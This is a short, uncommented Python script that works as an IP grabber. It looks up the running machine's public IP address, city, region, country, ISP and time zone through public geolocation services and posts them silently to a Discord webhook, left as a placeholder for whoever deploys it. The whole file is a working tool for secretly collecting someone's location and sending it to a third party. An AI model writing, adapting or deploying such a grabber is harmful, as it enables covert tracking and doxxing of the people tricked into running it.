import requests
import dhooks

def get_ip_info():
    ip_response = requests.get('https://ipinfo.io')
    ip_data = ip_response.json()

    geo_response = requests.get('https://freegeoip.app/json/')
    geo_data = geo_response.json()

    return {
        'IP Address:': ip_data['ip'],
        'City:': geo_data['city'],
        'Region:': geo_data['region_name'],
        'Country:': geo_data['country_name'],
        'ISP:': ip_data['org'],
        'Time Zone:': geo_data['time_zone']
    }

ip_info = get_ip_info()

webhook_url = 'YOUR_DISCORD_WEBHOOK_URL'
hook = dhooks.Webhook(webhook_url)

embed = dhooks.Embed(title='Details', color=0x99AAb5)

for key, value in ip_info.items():
    embed.add_field(name=key, value=value, inline=False)

hook.send(embed=embed)